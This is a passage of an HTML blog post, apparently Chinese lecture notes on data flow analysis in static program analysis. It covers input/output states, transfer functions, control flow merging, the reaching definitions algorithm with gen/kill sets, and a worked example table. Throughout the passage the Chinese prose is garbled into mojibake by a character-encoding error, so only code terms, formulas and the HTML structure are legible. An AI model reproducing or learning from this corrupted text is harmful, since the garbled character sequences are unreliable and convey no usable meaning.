States</code>(è¾“å…¥è¾“å‡ºçŠ¶æ€)ï¼šæˆ‘ä»¬çŸ¥é“ï¼ŒæŒ‡ä»¤<code>s</code>æ‰§è¡Œè¿‡åï¼Œç¨‹åºçš„çŠ¶æ€å°±å‘ç”Ÿäº†æ”¹å˜ï¼ˆä¾‹å¦‚æŸä¸ªå˜é‡è¢«èµ‹å€¼ï¼‰ï¼Œä¸ºäº†æè¿°æ”¹å˜å‰åçš„çŠ¶æ€ï¼Œæˆ‘ä»¬ç”¨ç¬¦å·<code>IN[s],OUT[s]</code>è¡¨ç¤ºï¼Œå‰è€…ä¹Ÿè¡¨ç¤ºæŒ‡ä»¤çš„çŠ¶æ€è¾“å…¥ï¼Œåè€…ä¹Ÿè¡¨ç¤ºæŒ‡ä»¤çš„çŠ¶æ€è¾“å‡ºï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</li></ul><p><img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210325210029.png" alt="Input Output States"></p><blockquote><p>æ³¨æ„åˆ°å›¾ä¸­è¿˜æœ‰ä¸€ä¸ª<code>program point</code> ï¼Œè¿™å’Œ<code>IN[s],OUT[s]</code>æ˜¯ç›¸å…³è”çš„ï¼Œè¡¨ç¤ºä¸ºç¨‹åºæ‰§è¡Œåˆ°çš„ç‚¹ï¼Œå¾ˆæ˜¾ç„¶å‡è®¾<code>s2</code> æ˜¯<code>s1</code>çš„åç»§ï¼Œå¿…ç„¶æœ‰<code>IN[s2]=OUT[s1]</code>ï¼Œå›¾ä¸­è¿˜åˆ—ä¸¾äº†å¦å¤–ä¸¤ç§åˆ†æ•£å’Œèšåˆçš„æƒ…å†µï¼Œåˆ†æ•£çš„æƒ…å†µä¸­<code>IN[s2]=IN[s3]=OUT[s1]</code>ï¼Œèšåˆçš„æƒ…å†µä¸­ï¼Œ<code>IN[s2]</code>å°±å’Œ<code>OUT[s1],OUT[s3]</code>ä¸¤è€…æœ‰å…³äº†ï¼Œä½†å…·ä½“æ˜¯ä»€ä¹ˆå…³ç³»è¦æ ¹æ®å…·ä½“çš„åˆ†ææƒ…å†µï¼Œè¿™é‡Œç”¨ä¸€ä¸ª<code>^(meet)</code>ç¬¦å·è¡¨ç¤ºï¼Œå®ƒå¯ä»¥æ˜¯âˆ©(äº¤é›†)ï¼Œä¹Ÿå¯ä»¥æ˜¯âˆªï¼ˆå¹¶é›†ï¼‰ï¼Œç”šè‡³æ˜¯å…¶ä»–çš„ä¸€äº›è”åˆæ“ä½œã€‚</p></blockquote><ul><li><p>åŸºäº<code>BB</code>çš„<code>States</code>ï¼š åœ¨é™æ€åˆ†æçš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬éƒ½æ˜¯ä»¥<code>BB</code>ä¸ºå•ä½è¿›è¡Œåˆ†æçš„ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å¯¹<code>IN[B],OUT[B]</code>åšå‡ºå®šä¹‰ï¼Œå›é¡¾<code>BB</code>æ˜¯ç”±å¤šæ¡æŒ‡ä»¤<code>s</code>ç»„æˆçš„ï¼Œå› æ­¤æˆ‘ä»¬å¾ˆå®¹æ˜“æœ‰å¦‚ä¸‹çš„å®šä¹‰ï¼š</p><p><img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210325211432.png" alt="image-20210325211432294"></p></li></ul><blockquote><p>è¿™ä¸ªå›¾å¯¹<code>IN[B]ã€OUT[B]</code>è¯ é‡Šåœ°å¾ˆå…¨é¢äº†ï¼Œè¿™é‡Œç®€å•è¯´æ˜ä¸€ä¸‹ï¼Œ<code>IN[s[i+1]]=OUT[s[i]]</code>ï¼ˆå› ä¸ºå®ƒä»¬æ˜¯é¡ºåºæ‰§è¡Œå…³ç³»ï¼‰,<code>IN[B]=IN[s1]</code>ï¼ˆæ•´ä¸ª<code>BB</code>çš„çŠ¶æ€è¾“å…¥æ¥æºäºç¬¬ä¸€æ¡æŒ‡ä»¤çš„è¾“å…¥ï¼‰,<code>OUT[B]=OUT[s[n]]</code>ï¼ˆæ•´ä¸ª<code>BB</code>çš„çŠ¶æ€è¾“å‡ºæœ€ç»ˆé€šè¿‡<code>s[n]</code>ä½“ç°ï¼‰</p></blockquote><ul><li><code>BBs</code> çŠ¶æ€è½¬æ¢ï¼šåœ¨æˆ‘ä»¬å®šä¹‰äº†<code>IN[B],OUT[B]</code>ä¹‹åï¼Œå¯¹äºä¸åŒæ§åˆ¶æµä¸­å—åˆ°å—ä¹‹é—´ï¼Œ<code>IN[B],OUT[B]</code>ä¼šå¦‚ä½•å˜åŒ–ï¼Ÿè¿™é‡Œåˆæœ‰ä¸¤ä¸ªæ¦‚å¿µï¼š<strong>Transfer Function, Control Flow</strong>ï¼ˆè½¬ç§»å‡½æ•°ï¼Œæ§åˆ¶æµï¼‰ï¼Œ<strong>Transfer Function</strong>æ˜¯é’ˆå¯¹å—è€Œè¨€çš„ï¼Œå¯¹äº<code>BB</code> ä¸­æŒ‡ä»¤çš„æ“ä½œï¼Œæˆ‘ä»¬å¯ä»¥å°è£…ç†è§£ä¸ºä¸€ä¸ªå‡½æ•°å¼ï¼ˆè¯¥å‡½æ•°æœ‰è¾“å…¥<code>IN[B]</code>ï¼Œè¾“å‡º<code>OUT[B]</code>ï¼‰ï¼Œé‚£ä¹ˆä»<code>IN[B]</code>è½¬ç§»åˆ°<code>OUT[B]</code>ï¼Œæˆ‘ä»¬å°±å¯ä»¥å®šä¹‰ä¸º</li></ul><p><img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210325213322.png" alt="image-20210325213322647"></p><blockquote><p>å…¶ä¸­$f_B$è¡¨ç¤ºç»è¿‡<code>BB</code>çš„<code>Transfer Function</code>ï¼Œåé¢æ˜¯å‡½æ•°åµŒå¥—ï¼Œè€Œä»<code>OUT[P]</code>æ€ä¹ˆè½¬æ¢åˆ°<code>IN[B]</code>å‘¢ï¼Ÿå®é™…ä¸Šå°±æ˜¯å’Œæˆ‘ä»¬ä¹‹é—´å®šä¹‰çš„èšåˆæƒ…å†µä¸­æŒ‡ä»¤ç±»ä¼¼ï¼Œåªè¦å°†æ¯ä¸ª<code>BB</code>çš„<code>OUT</code> åš<code>^</code>(meet)æ“ä½œå³å¯ï¼ˆæ³¨æ„meetä¸ä¸€å®šæ˜¯äº¤é›†ï¼‰ï¼Œè€Œè¿™é‡Œä¸ºä»€ä¹ˆè¿˜æœ‰<code>P a predecessor of B</code> (Pæ˜¯Bçš„ä¸€ä¸ªå‰é©±)ï¼Ÿè¿™æ˜¯å› ä¸ºåˆ†æçš„è¿‡ç¨‹åŒ…å«<code>forward</code>å’Œ<code>backward</code>ä¸¤ç§æ–¹å¼ï¼Œåœ¨æœ¬æ–‡ä¸­é‡‡ç”¨äº†<code>forward</code> çš„åˆ†ææ–¹æ³•ï¼Œåœ¨åé¢ä¼šè®²åˆ°<code>backward</code>çš„æ–¹å¼ã€‚</p></blockquote><p>æœ€ç»ˆæœ‰å¦‚ä¸‹å›¾ç¤ºï¼š</p><p>  <img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210325214236.png" alt="image-20210325214236514"></p><p>åˆ°æ­¤ï¼Œæˆ‘ä»¬æŠŠå¿…è¦çš„å‰ç½®çŸ¥è¯†è¯´æ˜å®Œæ¯•ï¼Œè¿™éƒ¨åˆ†å¦‚æœä¸ç†è§£å»ºè®®å»çœ‹ä¸€ä¸‹bç«™çš„è§†é¢‘ï¼Œè€å¸ˆè®²çš„ååˆ†è¯¦ç»†ã€‚</p><h2 id="Reaching-Definition-Analysis"><a href="#Reaching-Definition-Analysis" class="headerlink" title="Reaching Definition Analysis"></a>Reaching Definition Analysis</h2><p>å…‰ä»åå­—å°±çŸ¥é“è¿™æ˜¯ä¸€ä¸ªé’ˆå¯¹å®šä¹‰çš„åˆ†æï¼Œä½†<code>Reaching</code>åˆæ˜¯ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿè¿™é‡Œåˆè¦è®¾è®¡åˆ°ä¸€äº›å®šä¹‰ï¼š</p><ul><li><code>definition</code> ï¼šè¯´ç›´ç™½ç‚¹å°±æ˜¯å˜é‡çš„èµ‹å€¼è¯­å¥ï¼Œä¾‹å¦‚<code>v=3,v=k</code></li><li><code>reaching</code> ï¼šå…ˆå®˜æ–¹è§£é‡Šä¸€ä¸‹ï¼Œå˜é‡<code>v</code> ä»<code>program point</code> <code>p</code> <strong>reaching</strong><code>program point q</code>çš„å‰ææ˜¯å­˜åœ¨ä¸€æ¡ä»påˆ°qçš„è·¯å¾„ä¸”åœ¨è¯¥è·¯å¾„ä¸­<code>v</code>æ²¡æœ‰è¢«é‡æ–°å®šä¹‰ï¼Œå›¾ç¤ºå¦‚ä¸‹ï¼š</li></ul><p><img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210326190556.png" alt="image-20210326190555912"></p><blockquote><p>æ¢æˆäººè¯å°±æ˜¯ä¸¤ç¨‹åºæ‰§è¡Œç‚¹ä¹‹é—´æ²¡æœ‰æ–°çš„å…³äº<code>v</code>çš„èµ‹å€¼è¯­å¥ï¼Œè¿™ä¸ªä¹Ÿå°±è¡¨ç¤ºäº†æœ€å¼€å§‹<code>v</code>çš„å®šä¹‰åˆ°äº†<code>q</code>ä¾ç„¶æ˜¯æœ‰æ•ˆçš„ï¼Œä¾‹å¦‚:</p><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">v &#x3D; 3v &#x3D; 5  # æœ¬è¯­å¥é‡æ–°å®šä¹‰äº†vï¼Œä½¿å¾—v&#x3D;3å¤±æ•ˆk &#x3D; v  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></blockquote><p>ä¸‹é¢å°±åˆ°äº†å¦ä¸€ä¸ªé—®é¢˜ï¼Œä¸ºä»€ä¹ˆè¦åš<code>reaching definition analysis</code>ï¼Œä¸€ä¸ªç›´è§‚çš„ä½œç”¨å°±æ˜¯ç”¨äºæ£€æµ‹<code>undefined variables</code>ï¼Œåœ¨ç¨‹åºä¸­æ‰€æœ‰å‡ºç°çš„å˜é‡éƒ½æœ‰ä¸€ä¸ªåˆå§‹çŠ¶æ€ï¼Œå³<code>undefined</code>ï¼Œå‡è®¾åœ¨æŸä¸€æ¡è·¯å¾„ä¸Šå˜é‡<code>v</code>è¢«ä½¿ç”¨äº†<code>k = v</code>ï¼Œä½†æ­¤æ—¶<code>v</code>çš„çŠ¶æ€ä¾ç„¶æ˜¯<code>undefined</code>,å°±å‘ç”Ÿäº†ä½¿ç”¨æœªå®šä¹‰å˜é‡çš„é”™è¯¯ã€‚</p><p>çŸ¥é“äº†<code>reaching definition anlysis</code>çš„å®šä¹‰å’Œç›®çš„åï¼Œå°±è¦è®¾è®¡åˆ†æçš„è¿‡ç¨‹äº†ï¼Œè¿™ä¸ªè®¾è®¡è¿‡ç¨‹æ˜¯é™æ€åˆ†æè¿‡ç¨‹ä¸­éå¸¸ç»å…¸çš„ï¼Œåé¢å¦å¤–çš„ä¸¤ç§åˆ†ææ–¹å¼ä¹Ÿé‡‡ç”¨ä¸€æ ·çš„è®¾è®¡æ¨¡å¼ï¼Œå…·ä½“æ¥è¯´åŒ…æ‹¬ä¸‰æ­¥ï¼š</p><ol><li><code>Abstraction</code> ï¼šå¯¹è¦åˆ†æçš„å¯¹è±¡è¿›è¡ŒæŠ½è±¡ï¼Œè¿™æœ‰åˆ©äºæˆ‘ä»¬åé¢çš„è¡¨ç¤º</li><li><code>Transfer Function</code>ï¼šå®šä¹‰ç»è¿‡ç¨‹åºæ‰§è¡Œè¿‡åçš„çŠ¶æ€å˜åŒ–</li><li><code>Control Flow</code>: å®šä¹‰ä¸åŒç¨‹åºå—æ±‡èšæ—¶å€™çš„ç­–ç•¥ï¼Œä¸ºä»€ä¹ˆå•ç‹¬é’ˆå¯¹<strong>æ±‡èš</strong>çš„æƒ…å†µï¼Ÿæ˜¯å› ä¸ºåœ¨æ±‡èšçš„æ—¶å€™è¾“å‡ºçš„ç»“æœæœ‰ä¸åŒçš„ç»„åˆæ–¹å¼è¿›å…¥è¾“å…¥ï¼Œè¿™ä¸ªè¦æ ¹æ®å®é™…åˆ†æè€Œå®š</li></ol><h3 id="Abstraction"><a href="#Abstraction" class="headerlink" title="Abstraction"></a>Abstraction</h3><p>åœ¨æœ¬æ–‡çš„åˆ†æä¸­ï¼Œæˆ‘ä»¬å…³æ³¨çš„å¯¹è±¡æ˜¯<code>definition</code>ï¼Œæ›´ä¸€èˆ¬åœ°ï¼Œæ˜¯<code>definition</code>æ˜¯å¦å¯<code>reach</code>ï¼Œè€ƒè™‘åˆ°ç¨‹åºä¸­å¯èƒ½æœ‰éå¸¸å¤šçš„<code>definition</code>ï¼ˆå› ä¸ºæœ‰å¾ˆå¤šå˜é‡çš„èµ‹å€¼è¯­å¥ï¼‰ï¼Œæˆ‘ä»¬é‡‡ç”¨ä¸€ç§<code>bit vector</code>çš„æ–¹å¼è¿›è¡Œå®šä¹‰ï¼Œå‡è®¾ç¨‹åºæœ‰<code>D1,D2,...,Dn</code>å®šä¹‰ï¼Œç”¨1è¡¨ç¤º<code>reach</code>ï¼Œ0è¡¨ç¤ºä¸å¯<code>reach</code>ï¼Œé‚£ä¹ˆå®¹æ˜“å¾—åˆ°ä¸€ç»„å‘é‡<code>00000..00</code>(åˆå§‹åŒ–çš„æ—¶å€™éƒ½ä¸å¯<code>reach</code>)</p><h3 id="Transfer-Function"><a href="#Transfer-Function" class="headerlink" title="Transfer Function"></a>Transfer Function</h3><p>è½¬ç§»å‡½æ•°å–å†³äºç¨‹åºä¸­æ‰§è¡Œçš„æŒ‡ä»¤ï¼Œåœ¨è®¾è®¡<code>Transfer Function</code>çš„æ—¶å€™å°±è¦ç»“åˆå®šä¹‰æ€è€ƒï¼š<strong>pqä¹‹é—´ä¸èƒ½æœ‰æ–°çš„å¯¹äºvçš„å®šä¹‰</strong></p><ol><li>pqä¹‹é—´ä¸å­˜åœ¨å¯¹äºvçš„èµ‹å€¼è¯­å¥ï¼Œæ­¤æ—¶è¾“å…¥ä¸è¾“å‡ºä¸€è‡´æ²¡å˜åŒ–</li><li>pqä¹‹é—´å­˜åœ¨vçš„èµ‹å€¼è¯­å¥(<code>v=3</code>)ï¼Œè¿™æ—¶å€™æœ‰ä¸¤ä¸ªæ“ä½œï¼š<ul><li>å› ä¸ºæœ‰æ–°çš„èµ‹å€¼è¯­å¥ï¼Œæ‰€ä»¥è¯¥å¤„å®šä¹‰è¢«æ¿€æ´»</li><li>å› ä¸ºè¯¥å¤„å®šä¹‰è¢«æ¿€æ´»ï¼Œå¯¼è‡´å…¶ä»–æ‰€æœ‰ä¸è¯¥å®šä¹‰çš„vç›¸å…³çš„è¯­å¥å¤±æ•ˆ</li></ul></li></ol><p>ä¸Šé¢çš„è¯´æ³•å¯èƒ½æ¯”è¾ƒæŠ½è±¡ï¼Œçœ‹ä¸ªå›¾å°±æ˜ç™½äº†ï¼š</p><p><img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210326194634.png" alt="image-20210326194634046" style="zoom:50%;" /></p><blockquote><p>ä¸Šå›¾ä¸­é’ˆå¯¹ä¸åŒçš„<code>BB</code>ï¼Œå®šä¹‰äº†ä¸¤ç§é›†åˆ,$gen_B,kill_B$ï¼Œå‰è€…è¡¨ç¤ºï¼Œç»è¿‡è¯¥<code>BB</code>ï¼Œå¯¹åº”è¢«æ¿€æ´»çš„<code>definition</code>é›†åˆï¼Œåè€…è¡¨ç¤ºï¼Œç»è¿‡è¯¥<code>BB</code>ï¼Œå¯¹åº”å¤±æ•ˆçš„<code>definition</code>é›†åˆï¼Œä¾‹å¦‚åœ¨<code>B1</code>æ‰§è¡Œåï¼Œæ¶‰åŠçš„è¢«å®šä¹‰å˜é‡æœ‰<code>i,j,a</code>ï¼Œé‚£ä¹ˆè¿™ä¸‰å¥å®šä¹‰ç”Ÿæ•ˆï¼Œæ‰€æœ‰å…¶ä»–å¯¹<code>i,j,a</code>è¿›è¡Œå®šä¹‰çš„<code>definition</code>å¤±æ•ˆï¼Œå³$d_4,d_5,d_6,d_7$</p></blockquote><p>è€ƒè™‘åˆ°è¿˜æœ‰è¾“å…¥çš„çŠ¶æ€ï¼ˆå› ä¸ºè¾“å…¥åŒ…å«ä¹‹å‰è¢«æ¿€æ´»çš„æƒ…å†µï¼‰ï¼Œæ‰€ä»¥å¾—åˆ°å¦‚ä¸‹çš„<code>Transfer Function</code>ï¼š</p><p><img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210326195147.png" alt="image-20210326195147092"></p><blockquote><p>ä»è¾“å…¥ä¸­å»é™¤é‚£äº›å¤±æ•ˆçš„ï¼ŒåŠ ä¸Šæ–°è¢«æ¿€æ´»çš„å°±å¾—åˆ°äº†è¾“å‡º</p></blockquote><h3 id="Control-Flow"><a href="#Control-Flow" class="headerlink" title="Control Flow"></a>Control Flow</h3><p>è®¾æƒ³ä¸€ä¸‹ï¼Œå‡è®¾å¦‚å›¾ä¸‹çš„æƒ…å†µï¼Œåœ¨<code>P1</code>ä¸­åŒ…å«å¯¹vçš„å®šä¹‰ï¼Œ<code>P2</code>ä¸­æ²¡æœ‰ï¼Œé‚£ä¹ˆ<code>B</code>ä¸­<code>v</code>çš„å®šä¹‰æ˜¯å¦å¯è¾¾ï¼Ÿ</p><p><img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210326195400.png" alt="image-20210326195400882"></p><p>åè¿‡æ¥æƒ³ï¼Œå¦‚æœæˆ‘ä»¬è®¤ä¸ºåœ¨<code>B</code>ä¸­<code>v</code>çš„å®šä¹‰ä¸å¯è¾¾ï¼ˆä¹Ÿå°±æ˜¯æ²¡æœ‰å®šä¹‰ï¼‰ï¼Œå½“ç¨‹åºæ‰§è¡Œçš„è·¯å¾„ç»è¿‡<code>P1</code>æ—¶ï¼Œvå‡ºç°äº†å®šä¹‰ï¼Œè€Œåˆ°ä¸‹ä¸€ä¸ª<code>BB</code>ï¼Œvåˆæ²¡æœ‰å®šä¹‰äº†ï¼Œè¿™æ˜¾ç„¶æ˜¯ä¸æˆç«‹çš„ã€‚</p><p>æ¢è¨€ä¹‹ï¼Œåªè¦<code>B</code>çš„å‰é©±ç¨‹åºå—ä¸­æœ‰ä¸€ä¸ªå—å¯¹<code>v</code>çš„å®šä¹‰æ˜¯å¯è¾¾çš„ï¼Œé‚£ä¹ˆåœ¨<code>B</code>ä¸­å°±æ˜¯å¯è¾¾çš„ã€‚</p><h2 id="Reaching-Definition-Analysis-ç®—æ³•è®¾è®¡"><a href="#Reaching-Definition-Analysis-ç®—æ³•è®¾è®¡" class="headerlink" title="Reaching Definition Analysis ç®—æ³•è®¾è®¡"></a>Reaching Definition Analysis ç®—æ³•è®¾è®¡</h2><p>åšå¥½äº†ä¸€ç³»åˆ—å‰ç½®å‡†å¤‡å·¥ä½œåï¼Œæˆ‘ä»¬å°±éœ€è¦å®šä¹‰åˆ†æçš„æµç¨‹ï¼Œè¿™é‡Œå…ˆä¸ç€æ€¥ç›´æ¥çœ‹ç®—æ³•ï¼Œå…ˆæ€è€ƒå‡ ä¸ªç‚¹ï¼š</p><ol><li>æœ€å¼€å§‹çš„æ—¶å€™æ‰€æœ‰å˜é‡éƒ½æ²¡æœ‰å®šä¹‰</li><li>å½“ç¨‹åºå—æ‰§è¡Œè¿‡åï¼ŒæŸäº›å˜é‡ä¼šè¢«å®šä¹‰ï¼Œå³æŸäº›<code>definition</code>ä¼šè¢«æ¿€æ´»ï¼ŒåŒæ—¶æŸäº›ä¹Ÿä¼šå¤±æ•ˆ</li><li>åœ¨æ±‡èšï¼ˆmergeï¼‰çš„æ—¶å€™åç»§çš„è¾“å…¥ä¸å‰é©±çš„è¾“å‡ºæœ‰å…³ï¼Œè€ŒæŸäº›æƒ…å†µä¸‹ï¼Œåé¢çš„<code>BB</code>ç”±äºçŠ¶æ€æ›´æ–°åäº§ç”Ÿäº†å˜åŒ–ï¼ŒåŒæ—¶è¯¥å—åˆæ˜¯å‰é¢å·²æ‰§è¡Œå—çš„å‰é©±ï¼ˆå¸¸è§äºgotoï¼‰ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å°±åˆè¦å¯¹å‰é¢çš„å—ç»“æœè¿›è¡Œæ›´æ–°ï¼Œå› æ­¤ç®—æ³•å¿…ç„¶æ˜¯å¤šæ¬¡å¾ªç¯éå†ç¨‹åºå—çš„</li><li>å¾ªç¯éå†çš„ç»ˆç‚¹åº”è¯¥åœ¨äºæ‰€æœ‰å—çš„çŠ¶æ€éƒ½ä¸å‘ç”Ÿå˜åŒ–äº†ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ç›‘æµ‹å—çš„å‰åçŠ¶æ€æƒ…å†µ</li></ol><p>åŸºäºä»¥ä¸Šæ€è€ƒï¼Œå¾—åˆ°å¦‚ä¸‹ç®—æ³•ï¼š</p><p><img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210326202252.png" alt="image-20210326202252744"></p><ul><li><strong>è¾“å…¥</strong>ï¼šCFGã€<code>gen</code>å’Œ<code>kill</code>çš„é›†åˆï¼Œå› ä¸ºä¸€æ—¦ç¨‹åºå—ç¡®å®šäº†ï¼Œé‚£ä¹ˆæ¯ä¸ªå—çš„<code>gen</code>å’Œ<code>kill</code>æ˜¯ä¸ªå®šå€¼</li><li><strong>è¾“å‡º</strong>ï¼š<code>IN[B],OUT[B]</code>ï¼Œè¿™é‡Œè¾“å‡ºçš„çŠ¶æ€å®é™…ä¸Šå°±æ˜¯å‰é¢å¯¹<code>definition</code>çš„æŠ½è±¡è¡¨ç¤ºï¼Œä¾‹å¦‚æœ‰<code>D1,D2,D3</code>ï¼Œé‚£ä¹ˆçŠ¶æ€è¡¨ç¤ºå°±æ˜¯<code>000</code>ï¼Œå½“<code>D1</code>è¢«æ¿€æ´»ï¼Œåˆ™çŠ¶æ€è½¬å˜ä¸º<code>100</code></li><li><strong>æ–¹æ³•</strong>ï¼š<ol><li>ç¬¬ä¸€æ­¥åˆå§‹åŒ–æ‰€æœ‰$OUT[entry]=\phi$ ï¼Œå³ä»£è¡¨ä¸€å¼€å§‹æ‰€æœ‰å®šä¹‰éƒ½æ˜¯<code>undefined</code></li><li>ç¬¬äºŒæ­¥é’ˆå¯¹æ‰€æœ‰<code>BB</code>ï¼Œè®²è¾“å‡ºè®¾ä¸º$\phi$ ï¼Œè¿™ä¹Ÿå¾ˆæ˜¾ç„¶ï¼Œå”¯ä¸€è¦è¯´æ˜çš„æ˜¯ä¸¤è€…éƒ½æ˜¯è¦ç½®ç©ºï¼Œä¸ºä»€ä¹ˆè¦åˆ†å¼€æ¥ï¼Œè¿™ä¸ªå…¶å®æ˜¯ä¸ºäº†åˆ’åˆ†è¾¹ç•Œï¼Œå› ä¸ºæœ‰çš„ç®—æ³•ä¸ä¹‹ç±»ä¼¼ï¼Œä½†è¾¹ç•Œçš„åˆå§‹åŒ–å’Œå…¶ä»–åŸºæœ¬å—ä¸åŒï¼Œè¿™é‡Œåˆ’åˆ†å¼€ï¼Œå°±è®©ä¸¤ç§ç®—æ³•åœ¨ç»“æ„ä¸Šä¿æŒäº†ä¸€è‡´</li><li>ç¬¬ä¸‰æ­¥æ˜¯å¾ªç¯ï¼Œç»ˆæ­¢æ¡ä»¶æ˜¯æ‰€æœ‰è¾“å‡ºå—æ²¡æœ‰å‘ç”Ÿå˜åŒ–ï¼ŒåŒæ—¶å¯¹æ‰€æœ‰çš„<code>BB</code>ï¼ŒæŒ‰ç…§ä¹‹å‰å®šä¹‰çš„<code>Transfer Function, Control Flow</code>å®ç°æ›´æ–°</li></ol></li></ul><p>æœ‰ä¸€ç‚¹å€¼å¾—æ€è€ƒçš„åœ¨äºç®—æ³•èƒ½å¦ç»ˆæ­¢ï¼Œå…¶ä¸­æœ€æ ¸å¿ƒçš„åœ°æ–¹å°±æ˜¯<code>IN[B],OUT[B]</code>ï¼Œ<code>IN[B]</code>å–å†³äºæ‰€æœ‰çš„<code>OUT[P]</code>ï¼Œè€Œ<code>OUT[B]</code>åˆå–å†³äº<code>IN[B]</code>(<code>gen</code>,<code>kill</code>æ˜¯å›ºå®šå€¼)ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸€æ—¦<code>IN,OUT</code>æœ‰ä¸€ä¸ªä¸å˜ï¼Œå¦ä¸€ä¸ªå°±ä¸ä¼šå†å˜åŒ–ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦çœ‹ä¸€ä¸ªå—å°±å¥½ï¼Œå¯¹äºä¸€ä¸ª<code>BB</code>,ç”±äº<code>kill</code>æ˜¯å›ºå®šçš„ï¼Œç›¸å½“äºç»è¿‡è¿™ä¸ªå—è¢«<code>kill</code>çš„çŠ¶æ€æ’ä¸º0ï¼Œè€Œ<code>kill</code>æ˜¯å”¯ä¸€ä½¿å¾—1-&gt;0çš„å˜åŒ–ï¼Œæ‰€ä»¥è¯´ä¸€ä¸ªå—çš„çŠ¶æ€åªèƒ½ä»<code>0-&gt;1,1-&gt;1</code>ï¼Œç»è¿‡è‹¥å¹²æ¬¡å˜åŒ–åï¼Œå¿…ç„¶ä¼šåœæ­¢ï¼ˆæœ€åæƒ…å†µéƒ½æ˜¯1ï¼‰ï¼Œä¹Ÿå³<code>BB</code>æœ€ç»ˆè¶‹äºä¸å˜ï¼Œè¿™æ—¶å€™å¾ªç¯å°±ç»“æŸäº†ã€‚</p><h2 id="ä¸¾ä¸ªæ —å­"><a href="#ä¸¾ä¸ªæ —å­" class="headerlink" title="ä¸¾ä¸ªæ —å­"></a>ä¸¾ä¸ªæ —å­</h2><p>è¯´äº†é‚£ä¹ˆå¤šï¼Œä¸å¦‚å®é™…è·Ÿç€ä¸€ä¸ªä¾‹å­èµ°ä¸€éï¼Œç”±äºè§†é¢‘ä¸­é‡‡ç”¨åŠ¨å›¾ï¼Œå¦‚æœå°†æ¯ä¸€å¼ ä¸€ä¸€å±•å¼€å™è¿°ï¼Œå®åœ¨å¤ªè´¹ç¬”å¢¨ï¼Œè¿™é‡Œç›´æ¥ä»¥èµ·å§‹å’Œç»“æŸä¸¤å›¾ä¸ºä¾‹ï¼š</p><ul><li><strong>èµ·å§‹</strong>ï¼šå‡è®¾æŸ<code>CFG</code>å¦‚ä¸‹ï¼š</li></ul><p><img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210326204625.png" alt="image-20210326204625309" style="zoom:50%;" /></p><blockquote><p>å·¦è¾¹ä¸ºæ¡†æ¶å¯¹åº”çš„ç¨‹åºæºç ï¼ˆç¼©ç•¥ç‰ˆï¼‰ï¼Œå…¶ä¸­ä¸åŒé¢œè‰²æ ‡æ³¨çš„å®šä¹‰ä»£è¡¨äº†ä¸åŒå˜é‡</p></blockquote><ul><li><p><strong>ç»“æŸ</strong>ï¼š</p><p><img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210326204800.png" alt="image-20210326204800573"></p></li></ul><div class="table-container"><table><thead><tr><th></th><th>B1</th><th>B2</th><th>B3</th><th>B4</th><th>B5</th></tr></thead><tbody><tr><td><strong>gen</strong></td><td>D1,D2</td><td>D3,D4</td><td>D7</td><td>D5,D6</td><td>D8</td></tr><tr><td><strong>kill</strong></td><td>D5,D7,D4</td><td>D2</td><td>D1,D5</td><td>D1,D7,D8</td><td>D6</td></tr></tbody></table></div><blockquote><p>ç®€å•å¯¹å›¾ä¸­è¿è¡Œè¿‡ç¨‹è¿›è¡Œè¯´æ˜ï¼šå·¦ä¸Šè§’æ˜¯çŠ¶æ€çš„å®šä¹‰ï¼ˆä¸€å…±æœ‰8ä¸ª<code>definition</code>ï¼‰å’Œæ‰€ç”¨çš„è¿­ä»£æ¬¡æ•°ï¼Œä¸åŒé¢œè‰²ä»£è¡¨äº†ä¸åŒçš„è¿­ä»£è½®æ¬¡ï¼Œä¾‹å¦‚é»‘è‰²å°±è¡¨ç¤ºåˆå§‹åŒ–ï¼Œæ‰€æœ‰çŠ¶æ€éƒ½æ˜¯<code>0000 0000</code>ï¼Œç„¶åæ˜¯çº¢è‰²ï¼ˆä¸ºç¬¬ä¸€æ¬¡è¿­ä»£åçŠ¶æ€çš„å˜åŒ–ç»“æœï¼‰ï¼Œè¿™éƒ¨åˆ†åªè¦ç»“åˆç®—æ³•ä¸€æ­¥æ­¥è¿‡ä¸‹æ¥å³å¯ã€‚å»ºè®®è‡ªå·±åœ¨çº¸ä¸Šè¿ç®—ä¸€éï¼Œå†å’Œç»“æœå¯¹ç…§ã€‚ä¸Šé¢æˆ‘è¿˜ç»™å‡ºäº†æ¯ä¸ª<code>BB</code>çš„<code>gen</code>å’Œ<code>kill</code>ï¼Œé€šè¿‡æŸ¥è¡¨å¯ä»¥åŠ é€Ÿè®¡ç®—çš„è¿‡ç¨‹ã€‚</p></blockquote><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æœ¬æ–‡ç€é‡è®²è§£äº†æ•°æ®æµåˆ†æä¸­çš„<code>Reaching Definition 